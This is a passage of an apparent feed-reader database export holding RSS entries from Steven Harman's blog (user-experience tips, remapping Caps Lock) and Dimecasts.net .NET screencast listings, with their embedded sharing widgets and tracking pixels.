href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mjVxzIXjLvc:M25RZT6xlww:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mjVxzIXjLvc:M25RZT6xlww:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=mjVxzIXjLvc:M25RZT6xlww:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mjVxzIXjLvc:M25RZT6xlww:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=mjVxzIXjLvc:M25RZT6xlww:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/mjVxzIXjLvc\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":933}}
{"k":"0000000082","o":"0000002618","v":"001"}
{"_id":934,"_uid":934,"_dt":1373729346635,"_s":"f30c702a3c13eb1f1a836a2db3111f94"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/a-first-step-to-better-user-experience-thinking-like-a-human","title":"A First Step to Better User Experience: Thinking Like a Human","published":{"$wrap":"$date","v":1291810680000,"h":"2010-12-08T12:18:00.000Z"},"starred":false,"read":false,"content":"<p>As we strive to build more humane user experiences it is important tonot only consider what data to, or<em>not to</em>, show, but also<em>how</em>wepresent that data.</p><p>An example from our recent<a title=\"VersionOne: Conversations\"href=\"http://versionone.com/Product/Collaboration.asp\"rel=\"external\">Conversations</a>feature is the date and time at whichportions of a conversation take place.</p><p><a href=\"http://stevenharman.net/images/posts/fuzzy-time.png\"><img class=\"left\" src=\"http://stevenharman.net/images/posts/fuzzy-time-thumb.png\" title=\"humate date and time via jquery.timeago\"></a>Notice the two highlighted areas. Thetooltip shows fully-formatted, and much more precise information, withthe“less than a minute ago” text being a more fuzzy, human-friendlypresentation of the same data.</p><p>There is no question that the precise data is valuable, but when itcomes to human users of a system, it may not be the most consumableform. The full-fidelity information is still available to the user whocares to engage the application, when he cares to engage it.</p><p>Whether its fuzzy dates and time, or using avatars instead of usernames, or any number of other examples, the point is to<em>think</em>aboutthe human experience when designing for, well, humans.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=oDqdsROEVPw:xCCfy_DApfM:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=oDqdsROEVPw:xCCfy_DApfM:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=oDqdsROEVPw:xCCfy_DApfM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=oDqdsROEVPw:xCCfy_DApfM:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=oDqdsROEVPw:xCCfy_DApfM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=oDqdsROEVPw:xCCfy_DApfM:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/oDqdsROEVPw\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":934}}
{"k":"0000000082","o":"0000003068","v":"001"}
{"_id":935,"_uid":935,"_dt":1373729346640,"_s":"fd46b6f695a2770b421c06b61f6f8067"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/caps-lock-is-dumb-make-it-useful","title":"Caps Lock is Dumb; Make it Useful","published":{"$wrap":"$date","v":1295524800000,"h":"2011-01-20T12:00:00.000Z"},"starred":false,"read":false,"content":"<p>I’ve long thought that<code>Caps Lock</code>was quite dumb. Yes, I’m sure thereis some archaic reason it exists, but the truth is I don’t care. I don’tfind it useful and am annoyed that it’s taking up valuable room on my<atitle=\"The Home Row and Touch Typing\"href=\"http://en.wikipedia.org/wiki/Touch_typing\" rel=\"external\">HomeRow</a>. The more I use Vim the more angry I get at the<code>Caps Lock</code>key.</p><h3>Making Caps Lock Useful, on The Mac</h3><p>I long ago remapped<code>Caps Lock</code>to<code>Esc</code>on my Mac - which workedgreat for<a title=\"the missing editor\" href=\"http://macromates.com/\"rel=\"external\">TextMate</a>. However, these days I spend the majority ofmy time in<a title=\"Vim for the Mac\"href=\"http://code.google.com/p/macvim/\" rel=\"external\">Vim</a>or<atitle=\"Zeee Shell\" href=\"http://www.zsh.org/\" rel=\"external\">Zsh</a>(inVim mode) where I’d much prefer to have<code>Ctrl</code>on my Home Row.Remapping<code>Caps Lock</code>to<code>Ctrl</code>is trivial on OS X; it’s baked invia<em>System Preferences>Keyboard Preferences>Modifier Keys</em>.</p><!-- more --><h3>Making Caps Lock Useful, on The Windows</h3><p>To my knowledge, there is nothing baked into the<acronymtitle=\"Operating System\">OS</acronym>that makes this easy, but thereare a handful of utilities that will let you remap most keys. I optedfor the Lo-Fi route - hacking the registry to remap<code>Caps Lock</code>to<code>Ctrl</code>.</p><div><script src='https://gist.github.com/788631.js'></script><noscript><pre><code></code></pre></noscript></div><p>To use it, just download/save the raw<code>.reg</code>file to your Windows box,and the run (double-click, whatever) it.</p><p>And there you have it. Good bye, annoying<code>Caps Lock</code>. Hello, usefulstuff!</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=GDXql-9nohE:FISrtcpWrt4:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=GDXql-9nohE:FISrtcpWrt4:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=GDXql-9nohE:FISrtcpWrt4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=GDXql-9nohE:FISrtcpWrt4:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=GDXql-9nohE:FISrtcpWrt4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=GDXql-9nohE:FISrtcpWrt4:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/GDXql-9nohE\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":935}}
{"k":"0000000082","o":"0000002033","v":"001"}
{"_id":936,"_uid":936,"_dt":1373729451473,"_s":"cffa871735eb29ff5135d5b015dc829b"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/205","title":"Episode #205: Consuming a Web Api Endoints","published":{"$wrap":"$date","v":1334214000000,"h":"2012-04-12T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take a another look at the Asp.Net Web Api framework. However, in this episode we are going to look at how we can consume an endpoint in our console application.  We will learn how to create the connection as well as how to handle the data which we recieve from our call.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/205'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/205'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/205&title=Consuming a Web Api Endoints&description=Consuming a Web Api Endoints'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/205'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/205';</script><script type='text/javascript'>var dzone_title = 'Consuming a Web Api Endoints';</script><script type='text/javascript'>var dzone_blurb = 'Consuming a Web Api Endoints';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/205';digg_title = 'Consuming a Web Api Endoints';digg_bodytext = 'Consuming a Web Api Endoints';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":936}}
{"k":"0000000082","o":"0000001857","v":"001"}
{"_id":937,"_uid":937,"_dt":1373729981382,"_s":"ed8450ed0fbeff77883faef1403eb92a"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/204","title":"Episode #204: Self Hosting Web Api","published":{"$wrap":"$date","v":1333609200000,"h":"2012-04-05T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take a look at the Asp.Net Web Api framework. We are going to learn how we can self host a Web API endpoint inside our own application, outside of IIS.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/204'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/204'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/204&title=Self Hosting Web Api&description=Self Hosting Web Api'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/204'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/204';</script><script type='text/javascript'>var dzone_title = 'Self Hosting Web Api';</script><script type='text/javascript'>var dzone_blurb = 'Self Hosting Web Api';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/204';digg_title = 'Self Hosting Web Api';digg_bodytext = 'Self Hosting Web Api';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":937}}
{"k":"0000000082","o":"0000002087","v":"001"}
{"_id":938,"_uid":938,"_dt":1373729981384,"_s":"243912e183bcb7a13e09ff960b7f94f8"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/203","title":"Episode #203: Introduction to the Async/Await CTP","published":{"$wrap":"$date","v":1318402800000,"h":"2011-10-12T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going take a look at how to simplify asynchronous coding by utilizing the Async CTP.<br><br>The async CTP is a library is based off of the Task Parallel Library which introduced the Task<>type use.  In this episode we will learn how to use the async and await keywords in the Async CTP<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/203'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/203'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/203&title=Introduction to the Async/Await CTP&description=Introduction to the Async/Await CTP'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/203'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/203';</script><script type='text/javascript'>var dzone_title = 'Introduction to the Async/Await CTP';</script><script type='text/javascript'>var dzone_blurb = 'Introduction to the Async/Await CTP';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/203';digg_title = 'Introduction to the Async/Await CTP';digg_bodytext = 'Introduction to the Async/Await CTP';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":938}}
{"k":"0000000082","o":"0000002313","v":"001"}
{"_id":939,"_uid":939,"_dt":1373729981385,"_s":"9dfff5aa9a621feb2f4c6be9fd2713b8"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/202","title":"Episode #202: Silverlight - Learning how to use Value Converters","published":{"$wrap":"$date","v":1315551600000,"h":"2011-09-09T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take a look at how to use and harness the power of Value Converters.<br><br>A Value Converter (IValueConverter) allows for you to perform custom logic during Bind time in XAML based applications.  With a value converter you can implement pretty much any type of complex logic you want (bool to visibility, changing styles, etc) at runtime and have this logic extracted away in a stand alone class.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/202'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/202'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/202&title=Silverlight - Learning how to use Value Converters&description=Silverlight - Learning how to use Value Converters'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/202'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/202';</script><script type='text/javascript'>var dzone_title = 'Silverlight - Learning how to use Value Converters';</script><script type='text/javascript'>var dzone_blurb = 'Silverlight - Learning how to use Value Converters';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/202';digg_title = 'Silverlight - Learning how to use Value Converters';digg_bodytext = 'Silverlight - Learning how to use Value Converters';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":939}}
{"k":"0000000082","o":"0000002151","v":"001"}
{"_id":940,"_uid":940,"_dt":1373729981385,"_s":"5229367a74f0196b82ed745166579fbe"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/201","title":"Episode #201: Silverlight - Learning how to use Behaviors","published":{"$wrap":"$date","v":1314601200000,"h":"2011-08-29T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take a look at how to use and harness the power of Behaviors.<br><br>A Behavior in Silverlight is a way to extend an existing UI element in order to add additional state or actions to it.  We can create these Behaviors and attach them to pretty much any UI element you could hope for.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/201'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/201'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/201&title=Silverlight - Learning how to use Behaviors&description=Silverlight - Learning how to use Behaviors'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/201'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/201';</script><script type='text/javascript'>var dzone_title = 'Silverlight - Learning how to use Behaviors';</script><script type='text/javascript'>var dzone_blurb = 'Silverlight - Learning how to use Behaviors';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/201';digg_title = 'Silverlight - Learning how to use Behaviors';digg_bodytext = 'Silverlight - Learning how to use Behaviors';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":940}}
{"k":"0000000082","o":"0000002074","v":"001"}
{"_id":941,"_uid":941,"_dt":1373729981385,"_s":"aafc09ddedcd14b0554a63f8fd8ceef4"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/199","title":"Episode #199: NuGet - Getting Started w/ NuGet","published":{"$wrap":"$date","v":1313564400000,"h":"2011-08-17T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to learn how to use the NuGet Package Management System.<br><br>We will start off by looking at how to install NuGet inside of Visual Studio.  We will then learn how to use NuGet to install/uninstall packages.  We will end the episode by looking at how to create our first NuGet Package.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/199'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/199'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/199&title=NuGet - Getting Started w/ NuGet&description=NuGet - Getting Started w/ NuGet'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/199'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/199';</script><script type='text/javascript'>var dzone_title = 'NuGet - Getting Started w/ NuGet';</script><script type='text/javascript'>var dzone_blurb = 'NuGet - Getting Started w/ NuGet';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/199';digg_title = 'NuGet - Getting Started w/ NuGet';digg_bodytext = 'NuGet - Getting Started w/ NuGet';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":941}}
{"k":"0000000082","o":"0000002227","v":"001"}
{"_id":942,"_uid":942,"_dt":1373729981386,"_s":"8fcb79ddd748ca1244e5f68f253261bb"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/200","title":"Episode #200: Postsharp - Working with Advanced Aspects","published":{"$wrap":"$date","v":1314255600000,"h":"2011-08-25T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Matthew Groves<br><br>This episode we are we are going to continue to take a look at how to use the AOP (Aspect Orientated Programming) framework Postsharp.<br><br>In this episode we will focus on how to use the OnMethodBoundry, MethodInterceptions, LocationInterception and EventInterception Aspects.  We will look at how each of these can be used and how they can be used in conjuction with each other to build a better application.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/200'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/200'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/200&title=Postsharp - Working with Advanced Aspects&description=Postsharp - Working with Advanced Aspects'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/200'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/200';</script><script type='text/javascript'>var dzone_title = 'Postsharp - Working with Advanced Aspects';</script><script type='text/javascript'>var dzone_blurb = 'Postsharp - Working with Advanced Aspects';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/200';digg_title = 'Postsharp - Working with Advanced Aspects';digg_bodytext = 'Postsharp - Working with Advanced Aspects';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Matthew Groves","_id":{"$wrap":"$oid","v":942}}
{"k":"0000000082","o":"0000002237","v":"001"}
{"_id":943,"_uid":943,"_dt":1373729981386,"_s":"29218bfa6b0036c0d08a5c205a7081d8"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/191","title":"Episode #191: WP7: Learning to read/write to isolated storage","published":{"$wrap":"$date","v":1301900400000,"h":"2011-04-04T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>In this episode we are going to take a look at how to read and write data to Isolated Storage for Silverlight on the Windows Phone 7 platform.<br><br>Since the WP7 platform does not have a built in RDMS system you must utilized Isolated Storage in order to persist data between runs.  We will look at how to both read and write data using 2 different techniques in this episode.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/191'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/191'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/191&title=WP7: Learning to read/write to isolated storage&description=WP7: Learning to read/write to isolated storage'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/191'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/191';</script><script type='text/javascript'>var dzone_title = 'WP7: Learning to read/write to isolated storage';</script><script type='text/javascript'>var dzone_blurb = 'WP7: Learning to read/write to isolated storage';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/191';digg_title = 'WP7: Learning to read/write to isolated storage';digg_bodytext = 'WP7: Learning to read/write to isolated storage';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":943}}
{"k":"0000000082","o":"0000002118","v":"001"}
{"_id":944,"_uid":944,"_dt":1373729981387,"_s":"a38f6252b5291c1de16dd62ce2e7374c"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/197","title":"Episode #197: WP7 - Getting Started w/ SQL CE","published":{"$wrap":"$date","v":1312182000000,"h":"2011-08-01T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take a look at how to setup and use SQL Ce inside your WP7 Mango Applications.<br><br>Prior to Mango being released developers had to resource to storing their data in isolated storage, but now with SQL CE they can use a full RDBM system to store their data. In this episode we will take a look at how to get up and running with SQL CE<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/197'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/197'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/197&title=WP7 - Getting Started w/ SQL CE&description=WP7 - Getting Started w/ SQL CE'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/197'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/197';</script><script type='text/javascript'>var dzone_title = 'WP7 - Getting Started w/ SQL CE';</script><script type='text/javascript'>var dzone_blurb = 'WP7 - Getting Started w/ SQL CE';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/197';digg_title = 'WP7 - Getting Started w/ SQL CE';digg_bodytext = 'WP7 - Getting Started w/ SQL CE';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":944}}
{"k":"0000000082","o":"0000002244","v":"001"}
{"_id":945,"_uid":945,"_dt":1373729981388,"_s":"63453f559e53ad0d59ca398e01382505"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/194","title":"Episode #194: MVVM - How to create a ViewModelLocater","published":{"$wrap":"$date","v":1310367600000,"h":"2011-07-11T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>This episode we are we are going to take a look at how we can create a simple ViewModelLocator to inject our ViewModel into our DataContext at runtime via conventions.<br/><br/>The ViewModelLocator Pattern will allow you to create a very flexable application because it will decouple your Views from your ViewModel.  The approach in this episode will take a convention based approach to determine which ViewModel should go with a given View.<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/194'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/194'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/194&title=MVVM - How to create a ViewModelLocater&description=MVVM - How to create a ViewModelLocater'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/194'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/194';</script><script type='text/javascript'>var dzone_title = 'MVVM - How to create a ViewModelLocater';</script><script type='text/javascript'>var dzone_blurb = 'MVVM - How to create a ViewModelLocater';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/194';digg_title = 'MVVM - How to create a ViewModelLocater';digg_bodytext = 'MVVM - How to create a ViewModelLocater';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":945}}
{"k":"0000000082","o":"0000002205","v":"001"}
{"_id":946,"_uid":946,"_dt":1373729981389,"_s":"a755f0f64047d4323b7891c2817b93c2"}
{"subscription":{"$wrap":"$oid","v":20},"link":"http://www.dimecasts.net/Casts/CastFeedDetails/192","title":"Episode #192: WP7: Using Location Services&Bing Maps","published":{"$wrap":"$date","v":1304924400000,"h":"2011-05-09T07:00:00.000Z"},"starred":false,"read":false,"content":"<b>Author:</b>Derik Whittaker<br><br>In this episode we are going to take a look at how to use the Location Services (GPS) built into the Windows Phone 7 platform.<br><br>We will first take a look at how we can use the location servcies library on the phone to get the phones current GPS information.  We will then take a look at how we can use that information in conjuction w/ the Bing Services to get the street address for the GPS coordinates<br><br><br><a href='http://www.dimecasts.net/Content/WatchFeedEpisode/192'>Watch Here</a><br><a href='http://www.dimecasts.net/Casts/CastFeedDetails/192'>View Details Here</a><br><br><p><a href='http://www.dotnetkicks.com/submit/?url=http://www.dimecasts.net/Casts/CastDetails/192&title=WP7: Using Location Services&Bing Maps&description=WP7: Using Location Services&Bing Maps'><img alt='Submit this story to DotNetKicks' style='border-style: none' src='http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http://www.dimecasts.net/Casts/CastDetails/192'/></a><script type='text/javascript'>var dzone_url = 'http://www.dimecasts.net/Casts/CastDetails/192';</script><script type='text/javascript'>var dzone_title = 'WP7: Using Location Services&Bing Maps';</script><script type='text/javascript'>var dzone_blurb = 'WP7: Using Location Services&Bing Maps';</script><script type='text/javascript'>var dzone_style = '2';</script><script language='javascript' src='http://widgets.dzone.com/widgets/zoneit.js'></script><script type='text/javascript'>digg_url = 'http://www.dimecasts.net/Casts/CastDetails/192';digg_title = 'WP7: Using Location Services&Bing Maps';digg_bodytext = 'WP7: Using Location Services&Bing Maps';digg_media = 'video';digg_topic = 'microsoft';digg_skin = 'compact';digg_window = 'new';</script><script src='http://digg.com/tools/diggthis.js' type='text/javascript'></script></p>","author":"Derik Whittaker","_id":{"$wrap":"$oid","v":946}}
{"k":"0000000082","o":"0000002236","v":"001"}
{"_id":947,"_uid":947,"_dt":1373729981389,"_s":"c03d5590faf092ac100d20323f5f2ff2"}
